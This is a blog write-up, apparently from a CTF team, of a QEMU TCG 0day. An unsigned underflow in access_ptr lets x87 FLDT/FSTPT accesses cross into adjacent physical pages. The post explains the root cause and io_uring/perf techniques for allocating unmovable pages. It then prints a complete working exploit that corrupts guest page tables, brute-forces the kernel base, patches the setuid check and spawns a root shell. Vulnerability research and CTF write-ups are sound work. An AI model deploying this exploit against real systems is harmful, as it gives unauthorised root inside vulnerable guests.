+++
title = 'Exploiting a 0day on QEMU'
date = 2026-05-24T23:30:00+02:00
draft = false
author = 'prosti'
summary = 'Cheesing challenges running on QEMU TCG from v9.1 on with this 0day'
tags = [
    '0day',
    'QEMU',
    'TCG'
]
toc = true
+++
## The vulnerability

**FLDT** and **FSTPT** instructions (along with many others) in the latest versions of **qemu-system-x86_64** are broken and can be abused to achieve LPE inside the guest.
<br>
The root cause is in **access_ptr**. This function attempts to determine whether a guest memory access can safely use a direct host pointer. The check is incorrect when the first mapped fragment is smaller than the access size.
<br><br>

**FLDT** loads a 10-byte floating-point value from memory onto the x87 FPU stack, while **FSTP** stores and pops a value from the stack.
To better understand the issue, let’s analyze how `FLDT` works.
<br><br>
Here are all the functions relevant to the bug:<br><br>
**do_fldt**
```c
static floatx80 do_fldt(X86Access *ac, target_ulong ptr)
{
    CPU_LDoubleU temp;

    temp.l.lower = access_ldq(ac, ptr);
    temp.l.upper = access_ldw(ac, ptr + 8);
    return temp.d;
}
```

**access_lqd**:
```c
uint64_t access_ldq(X86Access *ac, vaddr addr)
{
    void *p = access_ptr(ac, addr, sizeof(uint64_t));

    if (likely(p)) {
        return ldq_le_p(p);
    }
    return cpu_ldq_le_mmuidx_ra(ac->env, addr, ac->mmu_idx, ac->ra);
}
```

**access_ptr**:
```c
static void *access_ptr(X86Access *ac, vaddr addr, unsigned len)
{
    vaddr offset = addr - ac->vaddr;

    assert(addr >= ac->vaddr);

    /* No haddr means probe_access wants to force slow path */
    if (!ac->haddr1) {
        return NULL;
    }

    if (likely(offset <= ac->size1 - len)) {
        return ac->haddr1 + offset;
    }
    assert(offset <= ac->size - len);
    /*
     * If the address is not naturally aligned, it might span both pages.
     * Only return ac->haddr2 if the area is entirely within the second page,
     * otherwise fall back to slow accesses.
     */
    if (likely(offset >= ac->size1)) {
        return ac->haddr2 + (offset - ac->size1);
    }
    return NULL;

}
```

Can you spot the bug?
<br><br>

**size1** represents how many bytes of the memory access fall within the first page. For example, if the address is near the end of a page — say at offset **0xffe** with a page size of **0x1000** — then **size1** will be **2**. **len** is the total size of the memory access, so in this case it will be **8**.
<br><br>
Because both **size1** and **len** are unsigned integers, the expression `ac->size1 - len` underflows. As a result, QEMU incorrectly concludes that the entire 8-byte access is safe and returns **haddr1** directly.
<br><br>

What does this actually mean? It means the final 6 bytes of the load are read from the next *physical* page instead of the next *virtual* page.

## Exploitation
### The idea
This vulnerability is so powerful that exploitation becomes almost trivial. The general idea is to map an unmovable page in userspace and then attempt to allocate a PMD physically adjacent to it. Once that succeeds, you can overwrite arbitrary PTEs and gain arbitrary physical read/write access.
<br><br>
You cannot reliably use normal movable pages for this. While it may be possible to overflow into a page belonging to another process and hijack it, that approach is outside the scope of this post.
<br><br>
So what can we use to allocate an unmovable page?

### io_uring
I found two methods (there many ways of doing this but these two work just fine).

io_uring allows users to register a pool of buffers that are identified by a group ID. This is done using the **IORING_REGISTER_PBUF_RING** opcode in the **io_uring_register** system call. Since **linux 6.4** the kernel allows users to delegate the allocation of provided buffer ring to the kernel instead of preallocating the buffers before the registration. This is done using the **IOU_PBUF_RING_MMAP** flag passed as an argument to **io_uring_register**. After **io_uring_register** returns we can **mmap** the buffers into userspace using as offset `IORING_OFF_PBUF_RING | (bgid ＞＞ IORING_OFF_PBUF_SHIFT)` where **bgid** is the group ID. To then unmap the page you can just call **munmap** and then **io_uring_register** with **IORING_UNREGISTER_PBUF_RING**.

So in the end, you would do something like this (snippets from an exploit):
```c
int setup_io_uring(){
    struct io_uring_params p = {0};
    ufd = io_uring_setup(1, &p);
    if(ufd < 0)
        err(1, "io_uring_setup failed");
    return ufd;
}

void* map_unmovable(int uringfd, void *addr) {
    struct io_uring_buf_reg breg = {0};
    struct io_uring_buf_ring* map;

    breg.bgid = BUFFER_GROUP_ID;
    breg.ring_entries = 1;
    breg.flags = IOU_PBUF_RING_MMAP;

    if(io_uring_register(uringfd, IORING_REGISTER_PBUF_RING, &breg, 1) != 0)
        err(1, "io_uring_register failed");


    map = mmap(NULL, 1 * sizeof(struct io_uring_buf), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, uringfd, (IORING_OFF_PBUF_RING | ((uint64_t)breg.bgid << IORING_OFF_PBUF_SHIFT)));

    if(map == MAP_FAILED)
        err(1, "mmap failed");

    return map;    
}

void unmap_unmovable(int uringfd, void *addr) {
    struct io_uring_buf_reg breg = {0};
    
    breg.bgid = BUFFER_GROUP_ID;
    breg.ring_entries = 1;

    munmap(addr, PAGE_SIZE);

    if(io_uring_register(uringfd, IORING_UNREGISTER_PBUF_RING, &breg, 1) != 0)
        err(1, "io_uring_unregister failed");
}
```

The function call sequence for the allocation of the unmovable page is:
- **sys_io_uring_register**
- **__io_uring_register**
- **io_register_pbuf_ring**
- **io_create_region**
- **io_region_allocate_pages**

Where **io_region_allocate_pages** (as of 7.0.9) is:
```c
static int io_region_allocate_pages(struct io_mapped_region *mr,
				    struct io_uring_region_desc *reg,
				    unsigned long mmap_offset)
{
	gfp_t gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN;
	size_t size = io_region_size(mr);
	unsigned long nr_allocated;
	struct page **pages;

	pages = kvmalloc_objs(*pages, mr->nr_pages, gfp);
	if (!pages)
		return -ENOMEM;

	if (io_mem_alloc_compound(pages, mr->nr_pages, size, gfp)) {
		mr->flags |= IO_REGION_F_SINGLE_REF;
		goto done;
	}

	nr_allocated = alloc_pages_bulk_node(gfp, NUMA_NO_NODE,
					     mr->nr_pages, pages);
	if (nr_allocated != mr->nr_pages) {
		if (nr_allocated)
			release_pages(pages, nr_allocated);
		kvfree(pages);
		return -ENOMEM;
	}
done:
	reg->mmap_offset = mmap_offset;
	mr->pages = pages;
	return 0;
}
```

I actually found out about this method when writing the exploit of this old CVE on io_uring. If you want to understand how this works in depth you should read [this post](https://blog.exodusintel.com/2024/03/27/mind-the-patch-gap-exploiting-an-io_uring-vulnerability-in-ubuntu/).

### perf
A team mate of mine (thanks **@amuro**) used gpt 5.5 with codeql to find methods to map unmovable pages and the clanker cooked this. I'll leave you guys a short explanation from the clanker itself.
<br><br>
**perf_event_open()** gives userspace a file descriptor. Calling **mmap()** on that fd allocates a perf ring buffer in the kernel and maps it into the process. The ring is backed by order-0 pages allocated with:

```c
alloc_pages_node(node, GFP_KERNEL | __GFP_ZERO, 0)
```

**GFP_KERNEL** does not include **__GFP_MOVABLE**, so these pages request **MIGRATE_UNMOVABLE**.

The same userspace API also works on configs that select **CONFIG_PERF_USE_VMALLOC** (we don't actually care about this but good to know); in that case perf uses:

```c
vmalloc_user((nr_pages + 1) * PAGE_SIZE)
```

### LPE
Once you are able to allocate a PMD in the adjacent page from the unmovable you can bruteforce the physical base of the kernel, find **sys_setuid** and patch it to get root privileges. You can also just open **/etc/passwd**, map it as r-only, change the permissions of the mapped page and overwrite its contents. **@ptr-yudai** documented this technique in this [post](https://ptr-yudai.hatenablog.com/entry/2025/09/14/180326). Remember to flush the TLB each time. 

## DEF CON Quals 2026 lore
There where two challenges from DEF CON Quals that where using an old version `qemu-system-x86_64`: **coalmine** and **gitvfs** (that was actually split into two parts). **gitvfs** wasn't even a kernel pwn challenge but it doesn't actually matter. Since they where using the **Ubuntu 24.04** image for their containers. **Ubuntu 24.04** ships with **QEMU 8.2.1** which is vulnerable to [our old nday](http://kqx.io/post/qemu-nday/) or **iret** and **call far**.<br>

The organizers decided to solve the problem by pulling the latest version of QEMU and building it in the container. This did patch the nday (since it is fully patched from version **9.1** on) but this vulnerability is present from **9.1** on so we solved the revenge challenges with this 0day. 

## Exploit
I will leave the exploit for gitvfs here (this solves the first and the second part to). The exploit for **coalmine** is very similar (you just have to adjust the offsets defined at the beginning of the exploit).

```c
#define _GNU_SOURCE
#include "helpers.h"
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

// tweak these for your kernel
#define KERNEL_NEEDLE       0x4101e9e8ae0f9066ul
#define KERNEL_ALIGNMENT    0x200000ul
#define KERNEL_START        0x1000000ul
#define KERNEL_SETUID_CHECK 0x2b1e20ul

#define RW_FLAGS    0x67
#define JNE_OPCODE  0x75


// modify this if you want to change the pt spray
#define UNMOVABLE_BASE 0xdeadbeef000ul
#define PRESPRAY_BASE 0xcafeba00000ul
#define SPRAY_BASE 0x60000ul
#define SPRAY_SIZE 0x50

// stuff for io_uring unmovable buffer
#define BUFFER_GROUP_ID 0

static int perf_event_open(struct perf_event_attr *attr, pid_t pid,
                           int cpu, int group_fd, unsigned long flags)
{
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

__attribute__((constructor))
void init(){
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
    
    if(getuid() == 0)
        system("/bin/sh");
}

// Store ST(0) to an 80-bit float at the given address
void fstp_to_addr(void *addr) {
    __asm__ volatile (
        "fstp tbyte ptr [%0]"
        :
        : "r" (addr)
        : "memory"
    );
}

// Load an 80-bit float from the given address into ST(0)
void fld_from_addr(void *addr) {
    __asm__ volatile (
        "fld tbyte ptr [%0]"
        :
        : "r" (addr)
        : "memory"
    );
}


void* map_unmovable(void *addr) {
    long page = sysconf(_SC_PAGESIZE);
    size_t data_pages = 1;
    size_t len = (data_pages) * page; /* metadata page + data ring */

    struct perf_event_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_period = 100000;
    attr.disabled = 1;
    attr.exclude_kernel = 1;
    attr.exclude_hv = 1;

    int fd = perf_event_open(&attr, 0, -1, -1, PERF_FLAG_FD_CLOEXEC);
    if (fd < 0) err(1, "perf_event_open");

    void *p = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (p == MAP_FAILED) err(1, "mmap");

    printf("metadata page: %p\n", p);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);

    *(char *)p = 'A';
    
    return p;
}

void unmap_unmovable(void *addr) {
    munmap(addr, PAGE_SIZE);
}

void spray_pt(void *base, size_t size, unsigned long *id) {
    for(int i = 0; i < size; ++i, (*id)++) {
        unsigned long *p = mmap((void*)(base + i*PAGE_SIZE*0x200), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED | MAP_POPULATE, -1, 0);
        
        if(p == MAP_FAILED)
            err(1, "mmap failed");

        *p = *id;
    }
}

void unspray_pt(void *base, size_t size) {
    for(int i = 0; i < size; ++i)
        munmap((void*)(base + i*PAGE_SIZE*0x200), PAGE_SIZE);
}

void* find_corrupted(void* prebase, size_t presize, void* postbase, size_t postsize, unsigned long id) {
    for(int i = 0; i < presize; ++i, ++id) {
        unsigned long *p = (unsigned long*)(prebase + i*PAGE_SIZE*0x200);
        if(*p != id){
            printf("expecting %lx, got %lx\n", id, *p);
            return p;
        }
    }

    
    for(int i = 0; i < postsize; ++i, ++id) {
        unsigned long *p = (unsigned long*)(postbase + i*PAGE_SIZE*0x200);
        if(*p != id){
            printf("expecting %lx, got %lx\n", id, *p);
            return p;
        }
    }

    return NULL;
}

typedef struct __attribute__((__packed__)) float_struct {
    uint16_t low;
    uint64_t payload:48;
    uint16_t high;
} float_struct_t;


// TLB flush
void evict(){
    for(int i = 0; i < 0x100; ++i){
        void *p = mmap((void*)(0x40000000000 + i*PAGE_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
        *(char *)p = 'A';
        if(p == MAP_FAILED)
            err(1, "mmap failed");
    }

    for(int i = 0; i < 0x100; ++i){
        munmap((void*)(0x40000000000 + i*PAGE_SIZE), PAGE_SIZE);   
    }

}

int main(){
    void *unmovable;
    int ufd;
    size_t prespray_size;
    float_struct_t* fs;
    
    srand(time(NULL));

    
    // this is just to ensure that the float_struct is at the beginning of a page
    fs = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    
    for(;;){
        puts("it 1");
        prespray_size = (rand() % 0x100) + 20;

        unsigned long id = 0;

        spray_pt((void *)PRESPRAY_BASE, prespray_size, &id);

        unmovable = map_unmovable((void*)UNMOVABLE_BASE);

        spray_pt((void *)SPRAY_BASE, SPRAY_SIZE, &id);

        fld_from_addr(unmovable+0xffe);
        fstp_to_addr(fs);

        printf("leaked: %lx\n", fs->payload);

        if((fs->payload & 0xff) == 0x67) {
            puts("pt after unmovable");
            break;
        }

        fs->payload = 0;

        unspray_pt((void *)PRESPRAY_BASE, prespray_size);
        unspray_pt((void *)SPRAY_BASE, SPRAY_SIZE);
        unmap_unmovable(unmovable);
    }

    printf("leaked pt: %lx\n", fs->payload);

    unsigned long phys_leak = fs->payload & ~0xfff;

    fs->payload += PAGE_SIZE;


    // corrupt the page table
    fld_from_addr(fs);
    fstp_to_addr(unmovable+0xffe);

    evict();

    // the pt could be from the prespray or postspray so we will just test both
    void* corrupted = find_corrupted((void *)PRESPRAY_BASE, prespray_size, (void *)SPRAY_BASE, SPRAY_SIZE, 0);

    if(corrupted == NULL)
        errx(1, "failed to find corrupted page table entry");
    
    printf("found corrupted page table entry at: %p\n", corrupted);

    // find kernel base and overwrite setuid
    unsigned long base;
    for(base = KERNEL_START; base < KERNEL_START + KERNEL_ALIGNMENT * 0x1000; base += KERNEL_ALIGNMENT){
        // set pte
        printf("testing kernel base: %p\n", base);
        fs->payload = base | RW_FLAGS;
        fld_from_addr(fs);
        fstp_to_addr(unmovable+0xffe);
        
        evict();

        if(*(unsigned long*)corrupted == KERNEL_NEEDLE){
            printf("found kernel base @ %p\n", base);
            break;
        }
    }

    // set pte
    fs->payload = base + (KERNEL_SETUID_CHECK & ~(PAGE_SIZE-1)) | RW_FLAGS;
    fld_from_addr(fs);
    fstp_to_addr(unmovable+0xffe);
    
    evict();

    ((unsigned char *)corrupted)[KERNEL_SETUID_CHECK & (PAGE_SIZE-1)] = JNE_OPCODE;

    setuid(0);
    printf("uid: %d\n", getuid());

    system("/bin/sh");

    return 0;
}
```

## Lore
As soon as the organizers dropped the patched versions of the challenges, our old post got a boost of views (which is kind of funny actually).

![graph](/images/qemu-0day/graph.jpg)